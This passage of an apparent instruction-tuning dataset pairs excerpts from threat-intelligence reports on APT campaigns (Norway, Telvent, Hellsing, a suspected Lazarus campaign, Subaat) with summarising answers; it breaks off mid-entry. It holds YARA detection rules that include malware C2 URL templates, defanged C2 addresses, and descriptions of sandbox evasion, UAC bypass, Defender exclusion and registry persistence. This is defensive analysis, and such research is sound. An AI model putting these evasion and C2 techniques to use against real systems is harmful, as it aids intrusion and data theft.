    "instruction": "Small Headline: Norway, November 2011\nNorway had the most prolific series of cyber-attacks in the country's history in November 2011.8 As reported by Norway's National Security Agency (NSM), more than 10 firms were targeted by an advanced persistent threat using spear-fishing attacks, many of which were in the oil industry.9 The attacks may have been ongoing for over a year. The companies were unaware of the attacks until concerned employees reported receiving suspicious emails.\nNo specific information was released on the tools or malware that were used to conduct these attacks; however NSM noted that a virus was used in conjunction with tailored spear-fishing attacks making use of trojan attachments.10 It appeared that the purpose of the attacks was large-scale data exfiltration. As was the case in Night Dragon, the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection. An article by Defense News quotes NSM as stating that \"the attacks have, on several occasions, come when the companies have been involved in large-scale contract negotiations.\"11 This could suggest that the attackers were privy to the negotiations. Interestingly, in 2010 Norway's Statoil was engaged in negotiations with China Oilfield Services, Ltd. (COSL). According to the Wall Street Journal, COSL is the \"oil-field services and rig-construction unit of state-controlled China National Offshore Oil Corp., the country's\nlargest offshore oil and gas company by output.\"12\n8  BBC News. (2011, November 18). Hackers attack norway's oil, gas, and defence businesses. BBC News Technology. Retrieved from http://www.bbc.co.uk/news/technology-15790082\n9  France-Presse, A. (2011, November 18). Norwegian defense firms hacked, intel reports. Defense News. Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-Firms-Hacked-Intel-Reports\n10  NSM (2011) Samme akt\u00f8r bak flere datainnbrudd . Retrieved From https://www.nsm.stat.no/Aktuelt/ Nytt-fra-NSM/Samme-aktor-bak-flere-datainnbrudd/\n11  France-Presse, A. (2011, November 18). Norwegian defense firms hacked, intel reports. Defense News. Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-Firms-Hacked-Intel-Reports\nThe goal of the attacks appeared to be the collection of confidential information, such as user names, passwords, industrial drawings, and other proprietary documents.13 This would seem to be consistent with the types of information sought in both Night Dragon and APT1. The timeframe of the attack aligns with the event timeline listed in the APT1 report, and within the report there is an event appearing in Norway. This is then a convergence of time and objectives across these operations which complement the tactical similarities involving the use of social engineering, persistent backdoors, and large scale data exfiltration.\nSmall Headline: Telvent, September 2012\nIn September 2012 Canadian energy company Telvent was infiltrated. Telvent is responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America.14 The attackers installed malware which they used to steal project files related to Telvent's OASyS SCADA product. According to security blogger Brian Krebbs, OASyS is \"a product that helps energy firms mesh older IT assets with more advanced 'smart grid' technologies.\" 15\nThe infiltration follows the same methodical approach exhibited in the Night Dragon and Norwegian intrusions. Not only was the malware difficult to detect, but it was planted using spear-phishing methods that targeted mid to high level executives16 17 .\nPerhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control (C2). The filenames \"fxsst.dll\" and \"ntshrui.dll\" which appear in the Telvent notification also appear in the APT1 report, along with the domains \"hugesoft.org\" and \"bigish.net\" which are noted as mainstays of APT1 by Mandiant. Several security firms at the time also reported the belief that the attack had been perpetrated by the \"comment group\" an alias in the Mandiant Report for APT1. In fact, Mandiant actually mentioned the Telvent attack in their report under a section entitled \"APT1 in the News.\"\nThe reason the Telvent attack is so important is that it represents the possibility for departure from simply data exfiltration. Although available information indicates that the goal of the attack was stealing software, the software could just have easily been modified and replaced. Attacking a prolific energy ICS company like Telvent means that a trojan could be planted in the software, being unintentionally distributed to Telvent's customers and offering the perpetrator an avenue for more insidious attacks.\n12  Simon Hall (2013, December 13). China, Norway Strike Oil Deal Despite Tensions. Wall Street Journal. Retrieved from http://online.wsj.com/article/SB10001424052748703727804576016841533225226.html\n13  Ibid.\n14  Vijayan, J. (2012, September 26). Energy giant confirms breach of customer project files. Computer-world. Retrieved from http://www.computerworld.com/s/article/9231748/Energy_giant_confirms_breach_of_ customer_project_files\n15  Krebs, B. (2012, September 26). Chinese hackers blamed for intrusion at energy industry giant telvent. Retrieved from http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-giant-telvent/#more-16936\n16  Vijayan, J. (2012, September 21). Cyber espionage campaign targets enery companies. Computerworld. Retrieved from http://www.computerworld.com/s/article/9231596/Cyber_espionage_campaign_targets_energy_ companies\n17  Ibid.\nSmall Headline: China\nPerhaps the most readily apparent attribution is to China as a state actor \u2013 the APT1 report makes a convincing argument for this which offers a lot of very well constructed circumstantial evidence. Night Dragon highlights the use of a RAT known as zwSheel which was used both as a to perform C2 and to create custom trojans. Interestingly, upon launch zwShell displays an error dialog with a hidden text field and the program will not function unless the password 'zw.china' is entered into this hidden text field. The ranges of consecutive IP addresses used were large enough that it is likely that the Chinese government had to be involved in some capacity.\nChina certainly possesses the motive to commit the attacks \u2013 according to the Washington Times, China is already surpassing the United States as the number one oil importer from the Middle East18 , and poised to become the number one oil importer globally.\nSmall Headline: Increasing Demand\nChinese demand for oil has grown dramatically as its economy continues to expand. Since the mid-1990s, China has been a net importer of oil.19 The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products. China has doubled its oil consumption in the last 10 years and become the second largest consumer of oil in the world behind the U.S.20 Like the U.S., China is now dependent on its oil imports to feed its thriving economy. It is estimated that China's import dependency could rise to over 50% by 2020.1\nChina's oil refineries are not capable of handling the current demand the economy is placing on them. There is evidence that the refineries used for fuel are at a competitive disadvantage when compared to other countries. To complicate matters, many Chinese oil refineries are also oriented to the making of diesel and not gasoline, which is in increasing demand1.\nThis means China is in great need of more sources of oil and more efficient refineries. The development of improved refining and mining equipment takes years and can cost millions of dollars. Exploration costs for finding new oil reserves have almost tripled in the past decade.21 They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process. It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own. This establishes that there are significant reasons for China to act on behalf of its own oil industry and use its state resources to conduct cyber-attacks against corporate entities worldwide.\n18  Hill, P. (March 14, 2013). China poised to top U.S. as oil buyer; increased car sales spur jump. Retrieved from http://www.washingtontimes.com/news/2013/mar/14/china-poised-to-top-us-as-top-oil-buyer/?page=all\n19  Skeer, J. (2007). China on the move: Oil price explosion?. Energy policy, 35(1), 678-691. http://discover.lib.purdue.edu:3210/purdue?ctx_ver=Z39.88-2004&ctx_enc=info%3Aofi%2Fenc%3AUTF-8&ctx_tim=2013-03-09T15%3A59%3A35IST&url_ver=Z39.88-2004&url_ctx_fmt=infofi%2Ffmt%3Akev%3Amtx%3Actx&rfr_id=info%3Asid%2Fprimo. exlibrisgroup.com%3Aprimo3-Article-wos&rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3A&rft.genre=article&rft. atitle=China%20on%20the%20\n20  Index Mundi, (2012). Country comparison > Oil \u2013 consumption > Top 10. Retrieved from http://www. indexmundi.com/g/r.aspx?v=91&t=10\n21  Johnson, C., (2010). Oil exploration costs rocket as risks rise. Retrieved from http://www.reuters.com/ article/2010/02/11/us-oil-exploration-risk-analysis-idUSTRE61A28X20100211\nChina's Oil Production\nQuestion: What was the significance of the Telvent attack in September 2012, and how does it relate to the tactics used in the Night Dragon and Norwegian intrusions?",
    "output": "Answer: The Telvent attack in September 2012 was significant because it targeted a company responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America. The attackers installed malware to steal project files related to Telvent's OASyS SCADA product, which helps energy firms integrate older IT assets with modern smart grid technologies. The attack followed a methodical approach similar to the Night Dragon and Norwegian intrusions, using spear-phishing methods to target mid to high-level executives and employing hard-to-detect malware. The attack is notable because it suggests a potential shift from simple data exfiltration to more insidious attacks, such as modifying and replacing software to plant trojans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Yara rules:\nversion = \"1.0\"\nfiletype = \"PE\"\nauthor = \"Costin Raiu, Kaspersky Lab\"\ncopyright = \"Kaspersky Lab\"\ndate = \"2015-04-07\"\ndescription = \"detection for Hellsing proxy testing tool\"\nstrings:\n$a1=\"PROXY_INFO: automatic proxy url => %s \"\n$a2=\"PROXY_INFO: connection type => %d \"\n$a3=\"PROXY_INFO: proxy server => %s \"\n$a4=\"PROXY_INFO: bypass list => %s \"\n$a5=\"InternetQueryOption failed with GetLastError() %d\"\n$a6=\"D:\\\\Hellsing\\\\release\\\\exe\\\\exe\\\\\" nocase\ncondition:\n($mz at 0) and (2 of ($a*)) and filesize < 300000\n}\nrule apt_hellsing_xkat {\nmeta:\nversion = \"1.0\"\nfiletype = \"PE\"\nauthor = \"Costin Raiu, Kaspersky Lab\"\ncopyright = \"Kaspersky Lab\"\ndate = \"2015-04-07\"\ndescription = \"detection for Hellsing xKat tool\"\nstrings:\n$mz=\"MZ\"\n$a1=\"\\\\Dbgv.sys\"\n$a2=\"XKAT_BIN\"\n$a3=\"release sys file error.\"\n$a4=\"driver_load error. \"\n$a5=\"driver_create error.\"\n$a6=\"delete file:%s error.\"\n$a7=\"delete file:%s ok.\"\n$a8=\"kill pid:%d error.\"\n$a9=\"kill pid:%d  ok.\"\n$a10=\"-pid-delete\"\n$a11=\"kill and delete pid:%d error.\"\n$a12=\"kill and delete pid:%d ok.\"\ncondition:\n($mz at 0) and (6 of ($a*)) and filesize < 300000\n}\nrule apt_hellsing_msgertype2 {\nmeta:\nversion = \"1.0\"\nfiletype = \"PE\"\nauthor = \"Costin Raiu, Kaspersky Lab\"\ncopyright = \"Kaspersky Lab\"\ndate = \"2015-04-07\"\ndescription = \"detection for Hellsing msger type 2 implants\"\nstrings:\n$a1=\"%s\\\\system\\\\%d.txt\"\n$a2=\"_msger\"\n$a3=\"http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy\n=%s\"\n$a4=\"http://%s/data/%s.1000001000\"\n$a5=\"/lib/common.asp?action=user_upload&file=\"\n$a6=\"%02X-%02X-%02X-%02X-%02X-%02X\"\ncondition:\n($mz at 0) and (4 of ($a*)) and filesize < 500000\n}\nrule apt_hellsing_irene {\nmeta:\nversion = \"1.0\"\nfiletype = \"PE\"\nauthor = \"Costin Raiu, Kaspersky Lab\"\ncopyright = \"Kaspersky Lab\"\ndate = \"2015-04-07\"\ndescription = \"detection for Hellsing msger irene installer\"\nstrings:\n$a1=\"\\\\Drivers\\\\usbmgr.tmp\" wide\n$a2=\"\\\\Drivers\\\\usbmgr.sys\" wide\n$a3=\"common_loadDriver CreateFile error! \"\n$a4=\"common_loadDriver StartService error && GetLastError():%d! \"\n$a5=\"irene\" wide\n$a6=\"aPLib v0.43 - the smaller the better\"\ncondition:\n($mz at 0) and (4 of ($a*)) and filesize < 500000\n}\n\nQ: How does the YARA rule for detecting the Hellsing proxy testing tool work, and what specific strings does it look for within the executable files? Explain the logic behind the condition specified in the rule.",
    "output": "A: The YARA rule for detecting the Hellsing proxy testing tool is designed to identify specific patterns within Portable Executable (PE) files. The rule looks for certain strings that are indicative of the Hellsing proxy testing tool. These strings include 'PROXY_INFO: automatic proxy url => %s', 'PROXY_INFO: connection type => %d', 'PROXY_INFO: proxy server => %s', 'PROXY_INFO: bypass list => %s', 'InternetQueryOption failed with GetLastError() %d', and 'D:\\\\Hellsing\\\\release\\\\exe\\\\exe\\\\'. The condition specified in the rule requires that the file starts with the 'MZ' signature (indicating a PE file), contains at least two of the specified strings, and has a file size of less than 300000 bytes. This combination of criteria helps to accurately identify the presence of the Hellsing proxy testing tool in the analyzed files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: THE FUTURE FOR POS ATTACKS\nPoS malware experienced a great deal of success during 2014, however upcoming changes may force changes in payment-processing systems in the U.S. For example, several major credit card companies are expected to institute new policies in October 2015 that will shift liability for fraudulent transactions to whomever\nLooking Forward\nis using the weakest payment-processing systems. The purpose of this is to drive retailers to adopt eMV (europay, MasterCard, and Visa) standards, which entail chip and PIN cards that use a combination of the traditional PIN number and an embedded microchip that encrypts vital information. This type of card offers a more secure payment card solution for consumers.\nAdditionally, several alternative solutions, such as Apple Pay and Google Wallet, have started becoming adopted, allowing for payment via token systems. In theses systems, rather than a card number being transmitted, a one-time token is passed from a consumer's device to the retailer. The advantage to this system is that in the event of the token being obtained by an unauthorized party, it cannot be reused for later transactions.\nAdoption of these newer payment processes should provide consumers with more secure payment methods and make it more difficult for criminals seeking to make money off these systems. There will be some lag time in 2015 as retailers and banks move to put these improvements in place, during which cybercriminals will still be able to exploit the current, antiquated payment processing systems in the U.S. However, the newer processes, once in place, should lead to a decline in the type of PoS attacks seen over the past year.\nDespite this decline, it is almost certain that the implementation of more secure methods will lead cybercriminals to develop more sophisticated means by which to attack payment- processing systems.\nSmall Headline: DESTRUCTIvE AND DISRUPTIvE ATTACKS\nDestructive attacks (such as those carried out by SILeNT CHOLLIMA) and disruptive attacks (such as the DDOS activity against gaming platforms) garnered headlines at the end of 2014. The high-profile nature of these attacks does not necessarily indicate that they will grow in popularity in 2015, however it is\nLooking Forward\npossible that the success of these attacks may encourage other groups to engage in destructive or disruptive operations to advance their interests.\nAs an example of this, a series of disruptive attacks in December targeted online gaming platforms. These attacks manifested in the form of DDOS operations carried out by the LizardSquad group briefly discussed above. The attacks came in two waves, the first of which was in early December when the Xbox Live and PlayStation networks were knocked offline for a short period of time. The second wave of attacks occurred on 25 December 2014 when the Xbox and PlayStation online platforms suffered more outages that LizardSquad claimed responsibility for. CrowdStrike Intelligence is also aware of DDOS threats against other gaming platforms including Valve Software, which appeared to be targeted by a DNS amplification DDOS attack that is similar to previous LizardSquad activity.\nMalicious actors have already engaged in disruptive campaigns in early 2015. Following the January terrorist attacks in France, a group of Islamist hackers known as Fallaga conducted DDOS attacks against servers hosting websites for French foreign embassies. Soon after, another Islamist group identifying with ISIS took control of the Twitter and youTube accounts for U.S. Central Command and posted a number of messages threatening U.S. troops and their families.\nOrganizations in all sectors should be aware of, and prepared for, destructive and disruptive attacks. These operations are often motivated by a specific grievance, but sometimes no clear motivation can be established. Continuous monitoring for publicized threats against an organization, or for potential areas of controversy that could motivate malicious activity, is vital to detect and prepare for these types of attacks.\nBig Headline: Conclusion\nConclusion\nIn the course of reviewing 2014, there were so many interesting events, adversaries, and innovations that selecting examples for this report was an incredible challenge. The CrowdStrike Intelligence team spent much time narrowing the scope of topics covered herein. The adversaries in 2014 proved, if nothing else, to be dynamic, persistent, and innovative. Defenders must be inventive, diligent, and decisive in their efforts to defend the enterprise from these attackers.\n2015 will be a continuation of the cat-and-mouse game that is played between the adversary and the defender. Adversaries across the motivational spectrum will continue to evolve their tactics in order to achieve their objectives. Although tactics may evolve, network defenders will be able to have success against the adversary so long as they are well prepared.\nIntelligence will provide the decisive advantage to both sides, and having a good defense will be predicated on having an informed, intelligent defensive team. The incorporation of intelligence into the daily defense of the enterprise will continue to be paramount and products, services, and solution providers will need to use this intelligence to stay ahead of the adversary.\nAt CrowdStrike, intelligence powers everything we do, and as 2015 unfolds, organizations using intelligence will be better prepared to detect, deter, and defend against their adversaries.\nMedium Headline: CrowDSTrIKe FAlCon intelligenCe\nCrowdStrike Falcon Intelligence portal provides enterprises with strategic, customized, and actionable intelligence. Falcon Intelligence enables organizations to prioritize resources by determining targeted versus commodity attacks, saving time and focusing resources on critical threats. With unprecedented insight into adversary Tactics, Techniques, and Procedures (TTPs) and multi-source information channels, analysts can identify pending attacks and automatically feed threat intelligence via API to SIEM and third-party security tools.\nAccess to CrowdStrike Falcon Intelligence is geared toward all levels of an organization, from the executive who needs to understand the business threat and strategic business impact, to the front-line security professional struggling to fight through an adversary's attack against the enterprise.\nCrowdStrike Falcon Intelligence is a web-based intelligence subscription that includes full access to a variety of feature sets, including:\n\u2022 Detailed technical and strategic analysis of 50+ adversaries' capabilities, indicators and tradecraft, attribution, and intentions\n\u2022 Customizable feeds and API for indicators of compromise in a wide variety of formats\n\u2022 Tailored intelligence that provides visibility into breaking events that matter to an organization's brand, infrastructure, and customers\nLet us show you how CrowdStrike can help you understand your adversary and better protect your network in 2015!\nContact sales@crowdstrike.com to discuss your specific needs. 888-512-8906\nBig Headline: AboUT CrowdStrike\ncrowdstrike\u2122 is a leading provider of next-generation endpoint protection, threat intelligence, and services. CrowdStrike Falcon enables customers to prevent damage from targeted attacks, detect and attribute advanced malware and adversary activity in real time, and effortlessly search all endpoints, reducing overall incident response time.\ncrowdstrike customers include some of the largest blue chip companies in the financial services, energy, oil & gas, telecommunications, retail, and technology sectors, along with some of the largest and most sophisticated government agencies worldwide.\nto learn more, please visit www.crowdstrike.com\n\nQuestion: How might the adoption of eMV standards and token systems impact the landscape of Point-of-Sale (PoS) attacks? Explain the mechanisms behind these systems and their implications for cybersecurity.\n\nAnswer:",
    "output": "The adoption of eMV standards and token systems is expected to significantly enhance the security of payment processing systems. eMV standards involve the use of chip and PIN cards, which combine a traditional PIN number with an embedded microchip that encrypts vital information, providing a more secure payment solution. Token systems, such as those used by Apple Pay and Google Wallet, transmit a one-time token instead of a card number, making it impossible for an unauthorized party to reuse the token for future transactions. These advancements should make it more difficult for cybercriminals to exploit payment systems, potentially leading to a decline in PoS attacks. However, it is anticipated that cybercriminals will develop more sophisticated methods to counter these new security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 0x01 decoy file\nThe attack sample captured this time is a docx file, all of which use the Microsoft Office/WordPad remote code execution vulnerability, its vulnerability number is CVE-2017-0199, and the decoy analysis of the related samples is as follows:\nthe bait file induces the victim to click \"enable content\" in a number of ways. for example, \uae34\uae09\uc7ac\ub09c\uc9c0\uc6d0\uae08\uc2e0\uccad\uc11c\uc591\uc2dd .docx (emergency disaster assistance request form) induces users to click on enable content by displaying garbled file content.\nThe bait file CH \u0141\u0141\u0141PH \u0141(9) .docx (Daehan Mine Development Shares) shows that the document was produced by Windows 11, inducing the victim to click on the enabled content.\nMedium Headline: 0x03 injected code\nthe injected code is first anti-sandboxed in the main function.\nAt the same time, it will detect whether the currently running process contains v3l 4sp .exe, and if so, exit the program. v3l4sp .exe a subroutine of south Korean AhnLa b's free antivirus software V3 Lite, indicating that the target of this attack is not for in dividual users in South Korea.\nSubsequently, the error .log is released in the %AppData%Local\\Microsoft\\TokenB roker directory, and \"s/o2ldz9l95itdj2e/error.txt?dl=0\", and the Release RuntimeBroke r .exe is decrypted in the same directory.\nThe UAC Bypass technology of the native RPC interface is then used to perform the RuntimeBroker .exe.\nfinally, it is persisted through the registry startup key.\nMedium Headline: 0x04 RuntimeBroker.exe\nRuntimeBroker .exe interfered with the researchers' analysis by adding a UPX shel l, and after dehulling, it was found that it also detected the sandbox in the main func tion, and also detected whether the currently running process contained v3l4sp.exe a nd AYAgent.aye. AYAgent.aye is part of ALYac, south Korea's Internet security suite, es tsoft.\nVerify whether the currently running program path is a RuntimeBroker .exe in the %AppData%Local\\Microsoft\\TokenBroker directory, or delete itself if it is not, which is to evade dynamic detection of the sandbox.\nIt is then added to windows Defender's exclusion list using the PowerShell command.\nRead the contents of the released error .log file and stitch it together with the URL dl.dropboxusercontent.com of the cloud server Dropbox, so that it acts as an intermediary to pass the C2 information.\nThe user information is then uploaded to the hxxp://naveicoipg.online/post2.php in the specified format \"uid=%s&avtype=%d&avtype=%d&majorv=%d\", where the va lue of avtype is 1 when no soft kill is specified, 2 when v3l4sp .exe is present, and 3 w hen AYAgent.aye is present.\nSubsequent visits naveicoipg.online's \"/fecommand.acm\" page to get the payload, where uid is the victim ID of the previous callback C2.\nthe obtained instruction content calls the function sub_401410 executed, and the malware maintains an array of structs of size 100 to record the executed instructions.\nIf the instruction has not been executed before, the calling function sub_401280 download the corresponding subsequent payload from C2, download the subsequent URL format is \"/< instruction name >\", and the obtained content will be executed as a PE file.\nunfortunately, subsequent content is not available as of the time of analysis.\nBig Headline: traceability and correlation\nBy searching the database for the keyword \"fecommand.acm\", we discovered another way to spread attack samples, distributed by using CHM files.\nThe retrieved chmext .exe malicious program whose parent file is a CHM file.\nthe short link in the bait chm file was redirected to the actual website of the korean centers for disease control and prevention, which echoed the bait file name, making it easier for the victim to get caught.\nAfter comparison, the chmext .exe is basically the same as the above injected cod e, only C2 is different, chmext .exe C2 is naveicoipc.tech.\nIN THE PROCESS OF CONTINUING TO TRACE THE SOURCE, WE ALSO FOUND PHISHING EMAILS THAT IMPERSONATED THE KOREAN INTERNET INFORMATION CENTER. COMBINED WITH VARIOUS INDICATIONS, WE SUSPECT THAT THIS ATTACK IS\nFROM THE HANDS OF THE APT ORGANIZATION, ITS ATTACK TARGET IS NOT AN INDIVIDUAL ORDINARY USER, THE ATTACK METHODS ARE COMPLEX AND CHANGEABLE, ITS FOLLOW-UP REAL PAYLOAD IS RELATIVELY HIDDEN, AND THE NUMBER OF ATTACK SAMPLES IS LARGE, AND WE HAVE CAPTURED A LARGE NUMBER OF ATTACK SAMPLES IN A SHORT PERIOD OF TIME.\nCombing through the APT organization targeting South Korea, we found that this attack is suspected to be from the APT organization Lazarus, as early as a few years a go, the Lazarus organization was good at using the cloud server Dropbox to carry out the attack, followed by the February malwarebytes labs disclosed Lazarus's report [1], Lazarus also created the RuntimeBroker process in the attack process.\nCoincidentally, in the process of tracing the origin of C2, we found that as early a s March 25, the foreign security company Rewterz made an early warning of the navei coipc.tech domain name [2] , and the URL link in its warning was basically consistent w ith the sample link we captured earlier.\nBig Headline: summary\nas of the end of the draft, there are still new attack samples being discovered, whi ch is worth our vigilance!\nPHISHING EMAILS HAVE ALWAYS BEEN ONE OF THE IMPORTANT MEANS OF ATTA CKS BY APT ORGANIZATIONS, AND MOST USERS ARE NOT SECURITY-CONSCIOUS AN D ARE EASILY CONFUSED BY SPOOFED EMAILS, DISGUISED DOCUMENTS, AND DECEP TIVE HEADERS. THE QIANXIN RED RAINDROP TEAM REMINDS USERS TO BEWARE OF PHISHING ATTACKS, NEVER OPEN LINKS OF UNKNOWN ORIGIN SHARED ON SOCIAL MEDIA, DO NOT CLICK ON EMAIL ATTACHMENTS THAT EXECUTE UNKNOWN SOURCE S, DO NOT RUN UNKNOWN FILES WITH EXAGGERATED TITLES, AND DO NOT INSTALL\nSmall Headline: APPS FROM IRREGULAR SOURCES. BACK UP IMPORTANT FILES IN A TIMELY MANNER, UPDATE AND INSTALL PATCHES.\nIf you need to run, install an application of unknown origin, you can first use the Qianxin Threat Intelligence File Deep Analysis Platform (https://sandbox.ti.qianxin.co m/sandbox/page) to identify. At present, it supports in-depth analysis of files in vario us formats, including Windows and Android platforms [3].\nAT PRESENT, THE FULL RANGE OF THREAT INTELLIGENCE DATA BASED ON THE QI ANXIN THREAT INTELLIGENCE CENTER, INCLUDING THE QIANXIN THREAT INTELLIGEN CE PLATFORM (TIP), TIANQING, TIANYAN ADVANCED THREAT DETECTION SYSTEM, QI ANXIN NGSOC, ANDRXIN SITUATIONAL AWARENESS, ETC., HAVE SUPPORTED THE AC CURATE DETECTION OF SUCH ATTACKS.\nRead the text above and answer this question: What methods does the RuntimeBroker.exe use to interfere with researchers' analysis and how does it ensure persistence on the infected system?",
    "output": "RuntimeBroker.exe interferes with researchers' analysis by adding a UPX shell, which makes it more difficult to reverse engineer. After dehulling, it is found that the malware also detects the sandbox environment and checks for specific processes like 'v3l4sp.exe' and 'AYAgent.aye'. To evade dynamic detection, it verifies whether the currently running program path is a RuntimeBroker.exe in the %AppData%Local\\Microsoft\\TokenBroker directory, deleting itself if it is not. For persistence, the malware adds itself to Windows Defender's exclusion list using a PowerShell command and ensures it runs at startup through the registry startup key.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Tracking Subaat: Targeted Phishing Attack Leads to Threat Actor's Repository\nIn mid-July, Palo Alto Networks Unit 42 identified a small targeted phishing campaign aimed at a government organization. While tracking the activities of this campaign, we identified a repository of additional malware, including a web server that was used to host the payloads used for both this attack as well as others. We'll discuss how we discovered it, as well as possible attribution towards the individual behind these attacks.\nThe Initial Attack\nBeginning on July 16, 2017, Unit 42 observed a small wave of phishing emails targeting a US-based government organization. We observed a total of 43 emails with the following subject lines:\nInvention\nInvention Event\nWithin the 43 emails we observed, we found that three unique files were delivered, which consisted of two RTFs and a Microsoft Excel file. Both RTFs exploited CVE-2012-0158 and acted as downloaders to ultimately deliver the malware family. The downloaders made use of the same shellcode, with minor variances witnessed between them. Additionally, the RTFs made use of heavy obfuscation within the documents themselves, making it more difficult to extract the embedded shellcode.\nThe Microsoft Excel file contained malicious macros that resulted in dropping and subsequently executing Crimson Downloader. The Excel document contained a UserForm that in turn contained three text boxes. The embedded payload was hex-encoded and split between these three text boxes. The malicious macro extracted this information from the text boxes, dropped it to a specific location, and eventually executed the Crimson Downloader payload.\nDetailed information about these malware samples may be found in the of this blog.\nA curious aspect of this campaign is the use of Crimson Downloader in this email campaign. To date, we have not widely seen Crimson Downloader being used: in fact, we have only seen 123 unique instances of this malware family being used to date. Readers may recall a previous blog post from March 2016 that . That blog post discussed relationships with both and , which were both targeted campaigns that made use of Crimson Downloader aimed at diplomatic and political\ntargets. The connections we observed in this research leads us to believe there might be a connection between this most recent activity we observed and those campaigns. However, there is not enough evidence to say so decisively.\nExpanding the Scope from the Original Attacks\nWhen looking at the various malware samples encountered as we analyzed this campaign, we identified a total of three hosts/IP addresses, as shown in the following chart:\nStarting with the first IP address that was used by Crimson Downloader, we can see that this address appears to be located in Germany and is almost exclusively associated with this malware family. Based on our telemetry, this IP address has exclusively been used to communicate with Crimson Downloader. We observed a total of 16 unique Crimson Downloader samples starting in May of this year.\nMoving onto the second IP address of 115.186.136[.]237, we see that this IP address belongs to a Pakistan-based Internet Service Provider (ISP), based in Islamabad, that services both residential and commercial customers.\nThe subaat[.]com domain has historic WHOIS information from early 2016 that references a Pakistani location, as seen in the image below. Additionally, it uses pkwebhost[.]net for its DNS, which is a Pakistan-based hosting provider.\nThe references to Pakistan in conjunction with the use of Crimson Downloader, which has historically been associated with Pakistan actors, is certainly interesting.\nThe RTFs we observed in the original email campaign downloaded QuasarRAT from http://subaat[.]com/files/sp.exe. Checking this host led us to discover that directory listings were enabled. We were able to discover a large repository of malware on this open server.\nSince beginning this research, this domain has been suspended by the hosting provider. However, it returned in mid-August, hosting both a malicious APK and a known instance of QuasarRAT.\nIn total, we found 84 unique malware payloads hosted on this server, in addition to a number of miscellaneous scripts. The chart below shows the malware families we identified:\nAs we can see from the above chart, a wealth of different malware families were stored on this web server. Many of these malware families are considered to be commodity malware, or widely used by criminals. Palo Alto Networks has reported on many of these families in the past, including , , and to name a few. The large number of commodity malware families paints a very different picture from the original attack that made use of Crimson Downloader, which is not a widely used malware.\nA full list of SHA256 hashes associated with these samples may be found in the .\nOne thing that caught our eye was the large number of LuminosityLink malware samples stored on this server. Looking at the embedded configuration settings for these samples, we see that they are all similar. The following example shows one of these configurations. A script written in a previous blog post was used to generate the output below, it can be downloaded .\nThe email address shown above is used to register a customer's copy of LuminosityLink. All samples using this registered builder contain this email address. We found all 20 of the identified LuminosityLink samples contained this same email address. The primary domain shown above is registered to 115.186.136[.]237, which is the IP address used by QuasarRAT for Command and Control (C2) communications. Looking at other samples found within the web server repository, we identified a number of malware families communicating with this IP address, including the following:\nQuasarRAT\nLuminosityLink\nMeterpreter\nNJRAT\nRevengeRAT\nRemcosRAT\nWe also discovered that the email address discussed above was being used by an account on the popular HackingForum web forum service. The account in question that claims to own this email address is none other than 'Subaat'.\nLooking at this user's profile below, we can see their posting history: a total of 14 posts in the past two years. We also see a date of birth of 2/24/1990, stating that the individual is 27 years old.\nA quick look at the posting history indicates that this person was inactive starting around December 2016, but returned to posting in early July of this year. This is in line with the campaign witnessed against a US-based government organization that took place on July 16th.\nThe posts look to be related to various Office exploit builders and crypters. This again is in line with both the campaign we witnessed as well as the various malware we identified on subaat[.]com.\n\nBased on the above text, answer a question. Why did the Subaat phishing campaign use Crimson Downloader, and what makes this choice significant?",
    "output": "The Subaat phishing campaign used Crimson Downloader, which is notable because this malware family has not been widely observed in other attacks. Specifically, only 123 unique instances of Crimson Downloader have been documented. This choice is significant because it suggests a potential link to previous targeted campaigns that used Crimson Downloader, such as those aimed at diplomatic and political targets. These connections indicate that the threat actor behind the Subaat campaign might be connected to earlier activities, although the evidence is not conclusive.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 4.1 Compromised Victims: The Evidence\nMistakes on the part of the attackers allowed us to view the attackers' list of victims at four command and control locations. In addition, we were able to recover exfiltrated data from two locations. This provided us with a snapshot of the computers that have been compromised by the attacks. Thus, this is not a complete list of all those compromised by this attacker. Rather, it is simply those checking in with or uploading data to the portions of the network that we were able to view. Moreover, there was considerable overlap between different methods of command and control, with individual computers checking in at multiple locations. Therefore, we do not have consistent data across all compromised computers. There are two categories of victims: those for whom we only have technical identifying information, such as IP addresses; and those from whom we have recovered exfiltrated data but for whom we do not have IP addresses. In cases where we do not have IP addresses, the identity of the victim is determined from the contextual information found within the exfiltrated data itself.\nWe obtained information on victims from:\n\u2462 a web-based interface that lists cursory information on compromised computers located on one command and control server;\n\u2462 text files in web-accessible directories on three command and control servers that list detailed information on compromised computers;\n\u2462 information obtained from email accounts used for command and control of compromised computers\n\u2462 information obtained from one command and control server from which we retrieved exfiltrated documents (but not necessarily technical identifying information);\n\u2462 information obtained from our DNS sinkhole.\nThe primary method of identification used in this section is based upon the IP address of the compromised computer. We looked up the associated IP address in all five Regional Internet Registries (RiR) in order to identify the country and network to which the IP address is assigned. We then performed a reverse Domain Name System (DNS) look-up on each IP address. DNS is the system that translates domain names into IP addresses; reverse DNS is a system that translates an IP address into a domain name. This can potentially provide additional information about the entity that has been assigned a particular IP address. If we discovered a domain name, we then looked up its registration in WHOIS, which is a public database of all domain name registrations and provides information about who registered the domain name.\nIt was possible to identify the geographic location of the compromised computer at the country level as well as the network to which the IP address was assigned. However, in most cases there was little information in the RiRs pertaining to the exact identity of the 